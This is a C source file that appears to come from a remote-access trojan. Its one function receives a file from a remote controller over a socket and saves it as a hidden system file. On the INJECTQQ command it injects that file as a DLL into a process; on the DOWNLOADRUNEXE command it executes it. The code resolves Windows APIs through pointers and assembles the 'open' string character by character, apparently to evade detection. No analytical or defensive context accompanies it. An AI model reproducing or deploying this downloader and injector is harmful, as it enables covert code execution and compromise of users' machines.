
#include <windows.h>
#include <WinSock.h>
#include "../api.h"
#include "../public.h"
#include "NetWorkData.h"
#include "../InjectDll.h"
#include <dbghelp.h>
#include "StrHelper.h"
#include "log.h"


int DownloadFile(SOCKET s, char* lpdata, int datalen, int bufsize, int isrun) {
	NETWORKFILEHDR stfh = *(LPNETWORKFILEHDR)lpdata;
	char szfn[MAX_PATH] = { 0 };

	int ret = 0;

	char* lpfilename = lpdata + sizeof(NETWORKFILEHDR);
	memmove(szfn, lpfilename, stfh.srclen);

	char szdlfn[MAX_PATH] = { 0 };
	char szthispath[MAX_PATH] = { 0 };
	ret = GetPathFromFullName(szfn, szthispath);
	if (szthispath[0] != 0 &&
		szthispath[1] == ':' &&
		(szthispath[2] == '/' || szthispath[2] == '\\') &&
		(strstr(szthispath, "\\") || strstr(szthispath, "/")))
	{
		lstrcpyA(szdlfn, szfn);
		ret = MakeSureDirectoryPathExists(szthispath);
		if (ret <= 0)
		{
			return FALSE;
		}
	}
	else {
		lstrcpyA(szdlfn, strDataPath);
		lstrcatA(szdlfn, szfn);
	}

	char szlog[1024];

	char* lppackdata = lpdata + sizeof(NETWORKFILEHDR) + stfh.srclen;
	int packdatalen = datalen - (sizeof(NETWORKFILEHDR) + stfh.srclen);

	HANDLE hFile = lpCreateFileA(szdlfn, GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		wsprintfA(szlog, "DownloadFile open local file:%s error\r\n", szdlfn);
		writeLog(szlog);
		return FALSE;
	}

	DWORD dwCnt = 0;
	ret = lpWriteFile(hFile, lppackdata, packdatalen, &dwCnt, 0);

	int dstdatalen = stfh.packhdr.packlen - (sizeof(int) + stfh.srclen);
	int recvlen = 0;
	while (packdatalen < dstdatalen)
	{
		recvlen = lprecv(s, lpdata, bufsize, 0);
		if (recvlen <= 0)
		{
			wsprintfA(szlog, "DownloadFile lprecv file:%s block:%u error\r\n", szdlfn, packdatalen);
			writeLog(szlog);
			return NETWORK_ERROR_CODE;
		}
		ret = lpWriteFile(hFile, lpdata, recvlen, &dwCnt, 0);
		packdatalen += recvlen;
		if (packdatalen >= dstdatalen)
		{
			break;
		}
	}

	lpCloseHandle(hFile);
	wsprintfA(szlog, "DownloadFile lprecv file:%s block:%u ok\r\n", szdlfn, packdatalen);
	writeLog(szlog);

	if (isrun)
	{
		if (stfh.packhdr.cmd == INJECTQQ)
		{
			HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)InjectDllToProcess, szdlfn, 0, 0);
			lpCloseHandle(hThread);
		}
		else if (stfh.packhdr.cmd == DOWNLOADRUNEXE)
		{
			char szShowContentCmd[MAX_PATH] = { 0 };
			lpwsprintfA(szShowContentCmd, "\"%s\"", szdlfn);
			char szOpen[] = { 'o','p','e','n',0 };
			HINSTANCE hInst = lpShellExecuteA(0, szOpen, szShowContentCmd, 0, NULL, SW_NORMAL);
			//ret = lpWinExec(szdlfn,SW_SHOW);
		}
		else {

		}
	}

	return TRUE;
}